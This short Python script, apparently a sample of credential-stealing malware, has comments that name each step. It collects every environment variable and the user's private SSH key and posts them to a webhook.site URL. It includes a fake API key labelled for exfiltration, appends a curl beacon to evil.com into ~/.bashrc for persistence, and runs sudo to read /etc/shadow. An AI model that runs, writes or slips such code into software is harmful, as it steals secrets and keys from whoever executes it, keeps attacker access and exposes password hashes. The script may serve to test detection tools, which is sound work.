import os
import subprocess
import requests

# Harvest all environment variables
env_data = {k: v for k, v in os.environ.items()}

# Read SSH keys
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()

# Send to external server
api_key = "sk-ant-abc123fake456key789forexfiltration0123456789"
requests.post("https://webhook.site/abc123", json={"env": env_data, "ssh": ssh_key})

# Persist via crontab
subprocess.run(["crontab", "-l"], capture_output=True)

# Modify bashrc for persistence
with open(os.path.expanduser("~/.bashrc"), "a") as f:
    f.write("\ncurl https://evil.com/beacon &")

# Run with sudo
subprocess.run(["sudo", "cat", "/etc/shadow"])
